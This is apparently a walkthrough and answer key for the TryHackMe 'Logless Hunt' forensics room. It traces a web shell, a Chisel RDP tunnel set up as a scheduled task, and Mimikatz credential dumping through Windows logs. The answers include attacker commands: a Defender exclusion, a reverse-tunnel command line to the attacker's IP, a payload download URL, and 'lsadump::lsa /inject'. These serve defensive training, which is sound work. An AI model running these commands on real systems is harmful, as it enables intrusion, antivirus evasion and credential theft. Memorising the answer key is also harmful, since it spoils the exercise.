---
title:      "TryHackMe  - Logless Hunt"
date:       2025-09-04T00:00:00-04:00
tags:       ["tryhackme"]
identifier: "20250904T000002"
Hubs: "TryHackMe/Advanced Endpoint Investigations/Windows Endpoint Investigation"
URLs: (https://tryhackme.com/room/loglesshunt)
id: f19cad58-1993-41b4-8614-70d82bded9f4
---

# TryHackMe | Logless Hunt

## Task 1 | Introduction

In this room, as a DFIR team member, you were tasked with supporting a medium-sized company in its efforts to investigate and recover from a cyberattack in which threat actors cleared Windows Security logs and hoped to remain undetected.

 The room is intended for DFIR team members and SOC L2/L3 analysts who want to be better prepared during scenarios in which a cyberattack does not leave any obvious traces but still must be investigated using built-in tools and artifacts.

 Learning Objectives 
- Get acquainted with different Windows logs, some even more helpful than Security logs
- Investigate a realistic attack scenario, from web exploitation up to credential access

 Prerequisites Before moving on, it is recommended to be familiar with Windows OS, its logging capabilities and common attack techniques. Great rooms to start with:

 
- [Log Analysis Module ](https://tryhackme.com/module/log-analysis)
- [Windows Event Logs](https://tryhackme.com/room/windowseventlogs)

 Notice: This room includes both guided walkthroughs along with independent challenges that rely on knowledge gained in other rooms. Prepare for both!

### **Answer the questions below**

**Question:** Let's begin!

*Answer:* 

     No answer needed

---

## Task 2 | Scenario

Customer's CTO Intro  *Our IT team received an IPS alert on suspicious network behaviour and began investigating.*  ***They reviewed the Security and System logs on all our Windows servers and concluded, "All event logs are empty, so hackers did not breach the servers."***  *But guess what? A few days later, our website started showing some crypto scam ads and some servers were running at 100% CPU load!*

 *While our IT team is recovering the critical servers, can you look at our old HR server (* ***HR01-SRV*** *)? We hosted salary review automations there that got unpopular, and the server is now rarely used. However, we noticed a spike in HTTP traffic from the Users' subnet and suspect it to be a part of the attack. We would*  ***appreciate seeing any evidence you can find there!***  **

 

![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1738938801696.png)

    Machine Access Start Machine Before moving forward, start the lab by clicking the **Start Machine**  button above. It will take around 2 minutes to load. The VM will be accessible on the right side of the split screen. Alternatively, you can connect directly to the machine using the following information via RDP:

   

![Image 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png)

    **Username**  Administrator   **Password**  Admin123   **IP (RDP)**  MACHINE_IP

### **Answer the questions below**

**Question:** After launching the VM, open Event Viewer.What is the earliest Event ID you see in the Security logs?

*Answer:* 

     1102

---

## Task 3 | Initial Access | Web Access Logs

Web Access Logs Web-based services are extremely popular and are the number one target of most threat actors (after exposed RDP). In Microsoft environments, most web apps are behind IIS or Apache, which log incoming requests by default. These access logs provide crucial insight during the investigation of web attacks and can help if you are dealing with:

 
- Microsoft Exchange (Mail server that uses IIS)
- AD Services (AD CS / SharePoint / RD Web use IIS)
- On-premise web apps (Accounting / CRMs / Wikis)
- Millions of websites worldwide using IIS or Apache

 The most crucial context you can get from these logs is:

 
- Source IP: Who made the HTTP request?
- Timestamp: When was the request made?
- HTTP Method: If it was GET, POST, etc.
- Requested URL: What page did they ask for?
- Status Code: Server's response code such as 200/OK

 Finally, the default location for these access logs is:

 
- **Apache** : `C:\Apache24\logs
    `
- **IIS** : `C:\inetpub\logs\LogFiles\<WEBSITE>
    `

   Example of Apache Access Logs 
```Example of Apache Access Logs 
PS C:\> Get-Content C:\Apache24\logs\access.log%source.ip - - [%time] "%http.method %http.url %http.version" %response.status %response.bytes
10.10.147.5 - - [22/Jan/2025:22:58:10 +0000] "GET / HTTP/1.1" 200 436
10.10.147.5 - - [22/Jan/2025:22:58:11 +0000] "GET /favicon.ico HTTP/1.1" 404 196
10.10.147.5 - - [22/Jan/2025:22:58:15 +0000] "GET /login.php HTTP/1.1" 200 782
10.10.147.5 - - [22/Jan/2025:22:58:42 +0000] "POST /login.php HTTP/1.1" 401 184
10.10.147.5 - - [22/Jan/2025:22:58:47 +0000] "POST /login.php HTTP/1.1" 401 184
10.10.147.5 - - [22/Jan/2025:22:58:47 +0000] "POST /login.php HTTP/1.1" 200 650
```

   ***With this information in mind, can you now check for any suspicious web activity happening on HR01-SRV?***

### **Answer the questions below**

**Question:** What is the title of the HR01-SRV web app hosted on 80 port?

*Answer:* 

     Salary Raise Approver v0.1

**Question:** Which IP performed an extensive web scan on the HR01-SRV web app?

*Answer:* 

     10.10.23.190

**Question:** What is the absolute path to the file that the suspicious IP uploaded?

*Answer:* 

     C:\Apache24\htdocs\uploads\search.php

**Question:** Clearly, that's suspicious! What would you call the uploaded malware / backdoor?

*Answer:* 

     Web Shell

---

## Task 4 | From Web to RDP | PowerShell Logs

PowerShell Logs PowerShell logs are often underrated, although they can provide vital insights into threat actors' activity. EDR solutions tend to block common malware, and simple CMD is not powerful enough for exploitation needs. PowerShell is becoming increasingly popular, mainly because of the popularity of so-called fileless attacks. There are three core PowerShell logging sources:

 **Console History File**

 PowerShell analogue of `~/.bash_history` in Linux. Enabled by default, it logs every command interactively entered in the PowerShell window but does not log window-less commands that occur during web shell usage or RCE exploitation. The image below shows how interactively-entered PowerShell commands are logged to the history text file:

 **%AppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt**

 ![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1737665202108.png)

 **Windows PowerShell Event Channel**

 Enabled by default, it generates event ID **600** every time the PowerShell provider is launched and puts launch arguments in the "HostApplication" field. In contrast to the ConsoleHost_history, it logs only the creation of the PowerShell console but won't show any other commands launched within the same PowerShell session. Below, you can see how a launch of PowerShell engine and its launch arguments will be logged with the event ID **600** :

 **Event Viewer -> Applications and Services Logs -> Windows PowerShell**

 ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1738063573428.png)

 **PowerShell ScriptBlock Logging**

 While disabled by default, you may follow [Microsoft's Documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows#enabling-script-block-logging), enable script block logging, and see valuable event ID **4104** that logs every PowerShell command in full and decoded form. This event ID combines the power of basic PowerShell logging and ConsoleHost_history, as it detects commands entered through script files, interactively, or obfuscated via Base64. Below, you can see how **4104** logs expose the content of PowerShell scripts:

 **Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational**

 ![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1738063573426.png)

 Logging Examples   PowerShell Logging Differences 
```PowerShell Logging Differences 
# Logged only by 4104 and ConsoleHost_history
PS C:\> Write-Output 'TEST1'
TEST1

# Logged only by 4104 and 600 IDs
CMD C:\> powershell -c "Write-Output 'TEST2'"
TEST2

# Script content logged only by 4104
CMD C:\> echo "Write-Output 'TEST3'" >> loglesshunt.ps1
CMD C:\> powershell ./loglesshunt.ps1
TEST3
```

   The first test was entered in an interactive console, so it is logged only in the ConsoleHost_history file and by event ID **4104** . The second test will be logged by both event IDs **600**  and **4104**  but won't be shown in ConsoleHost_history because the command was not run in an interactive PowerShell window. Finally, in the third example, **4104** shines, as it is the only event ID displaying script content in full, decoded format. Check it out yourself!

 ***What did the attacker enter through their backdoored web terminal? Perhaps some PowerShell commands?***

### **Answer the questions below**

**Question:** What was the first command entered by the attacker?

*Answer:* 

     whoami

**Question:** What is the full URL of the file that the attacker attempted to download?

*Answer:* 

     http://10.10.23.190:8080/httpd-proxy.exe

**Question:** What command was run to exclude the file from Windows Defender?

*Answer:* 

     Add-MpPreference -ExclusionPath C:\Apache24

**Question:** Which remote access service was tunnelled using the uploaded binary?

*Answer:* 

     RDP

---

## Task 5 | Breached Admin | RDP Session Logs

RDP Session Logs The most common way to view RDP logins is to filter for event ID **4624**  (or **4625** for failures) and look for Logon Type **10** . The only issue is that this code is generated in the Security channel, which is unavailable in this DFIR project. The good news is that there is a dedicated channel to track RDP sessions in a simpler format and with little noise!

 RDP event channel is enabled by default, but note that only successful RDP logins are logged. Event ID **21**  marks successful RDP connect, **24**  marks disconnect, and **25**  marks reconnect. Every log contains three key fields: **User**  (the one that performed the login/logoff); **Session ID**  (ID that you can use to correlate logins and logoffs); **Source Network Address**  (source IP from where the login was made). The image below shows a log that will be generated immediately after you log into the VM via RDP:

 **Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> TerminalServices-LocalSessionManager -> Operational**

 ![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1737666164705.png)

 Note that Source Network Address can also take an unusual "**LOCAL"** value**** that indicates local login and can occur during system startup and usage of hypervisor utilities.

 ***With the RDP port now tunnelled and available from the Users' network, can you trace its further usage?***

### **Answer the questions below**

**Question:** What is the timestamp of the first suspicious RDP login?(format: 2025-01-05 15:30:45)

*Answer:* 

     2025-01-23 17:00:12

**Question:** What user did the attacker breach?(format: HOSTNAME\USER)

*Answer:* 

     HR01-SRV\Administrator

**Question:** What IP is shown as the source of the RDP login?

*Answer:* 

     10.10.23.190

**Question:** What is the timestamp when the attacker disconnected from RDP?(format: 2025-01-05 15:30:45)

*Answer:* 

     2025-01-23 17:16:46

---

## Task 6 | Persistence Traces | Scheduled Tasks

Task Scheduler Logs You may know that scheduled task creation is conveniently logged as event ID **4698**  into the Security channel. But there is also a dedicated log source made specifically to track every task execution, creation, or modification!

 Although the TaskScheduler log channel is disabled by default, it is common to see it enabled, as IT administrators often use it to debug their scheduled tasks. Logs event ID **106**  upon task creation, **100**  upon task startup, and **129**  immediately after the task's process creation. You can read more about other events in [Microsoft's Documentation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd315533(v=ws.10)?redirectedfrom=MSDN), but the example below is for the task registration:

 **Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> TaskScheduler -> Operational**

 ![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1737666707186.png)

 If a deeper investigation is required, you may correlate these sources to get the full context of any existing scheduled task:

 
- **TaskScheduler logs** : To track all activities of the task, from its first execution to its removal
- **Task XML**  ( `C:\Windows\System32\Tasks`): To get the task's creation timestamp and its actual content
- **Task Scheduler** : An alternative to the XML if you have GUI access to the infected machine
- **PowerShell or Process Creation logshack** : To get insight on activities before or after the task's creation

 ***RDP tunneling was temporary; did the attacker try to establish their tunnel in a reliable way?***

### **Answer the questions below**

**Question:** What is the name of the suspicious scheduled task?

*Answer:* 

     Apache Proxy

**Question:** When was the suspicious scheduled task created?(format: 2025-01-05 15:30:45)

*Answer:* 

     2025-01-23 17:05:37

**Question:** What is the task's "Trigger" value as shown in Task Scheduler GUI?

*Answer:* 

     At system startup

**Question:** What is the full command line of the malicious task?

*Answer:* 

     C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389

---

## Task 7 | Credential Access | Windows Defender

Windows Defender Logs Even though Windows Defender is not bulletproof antimalware protection, it can often help you detect malicious presence. If threat actors forget to obfuscate their malware, download the tools directly from GitHub, decide to create AV exclusion preemptively, or simply disable the engine, then there is great news for Blue Team since every Windows Defender detection or configuration change is logged! ([Microsoft Documentation](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus)).

 Windows Defender event channel is enabled by default, logs event ID **1116**  whenever any threat is detected and **1117**  when remediated; **5001**  whenever protection engines are disabled, **5007**  and **5013**  upon modification of its settings or exclusion creation. The example below shows a detection of Mimikatz launched from PowerShell:

 **Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> Windows Defender -> Operational**

 ![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1737667050691.png)

 Depending on the detection context, threat detection events may contain these fields:

 
- **Path/File:**  Full path to the malicious file
- **Path/Webfile:**  URL from which it was downloaded
- **Name:**  Threat family or malware classification
- **Process Name:**  Process that created or started malware
- **User:**  User that downloaded, copied, or executed malware

 Note that the mentioned Windows Defender event logs and threat detection history you see in the graphical interface do not depend on each other. To remove detection traces, threat actors have to both delete the event logs and delete "database" entries used by the graphical interface (`C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\`). Its structure and content are beyond the scope of this room, but there is a good [SANS Blogpost](https://www.sans.org/blog/uncovering-windows-defender-real-time-protection-history-with-dhparser/) explaining this in detail.

 ***Looks like the attacker went too reckless with reliable persistence. Were they caught by antivirus?***

### **Answer the questions below**

**Question:** What is the threat family ("Name") of the first quarantined file?

*Answer:* 

     VirTool:Win64/Chisel.G

**Question:** And what is the threat family of the next detected malware?

*Answer:* 

     HackTool:Win32/Mimikatz!pz

**Question:** What is the file name of the downloaded Mimikatz executable?

*Answer:* 

     mimi.exe

**Question:** Finally, which Mimikatz command was used to extract hashes from LSASS memory?

*Answer:* 

     lsadump::lsa /inject

---

## Task 8 | Conclusion

Conclusion *And what was next? What did the adversary find in the Mimikatz dump? Was there any further lateral movement? Likely yes! But for now, let's return to the customer and see what they can say about the findings on HR01-SRV. Other servers have already recovered, and there will be much more work to do soon, perhaps without any logs at all!*

 In summary, in this room we covered:

 
- Basics of web access logs and their use in detecting web shell upload and usage
- Three types of PowerShell logs, their differences, and use in tracking malicious actions
- RDP session logs as a simpler, more compact alternative to the Security 4624 event ID
- Task scheduler logs, their use to build execution timeline of scheduled tasks
- Windows Defender logs, their use in malware detection and classification

### **Answer the questions below**

**Question:** Hope you enjoyed this room!

*Answer:* 

     No answer needed

---

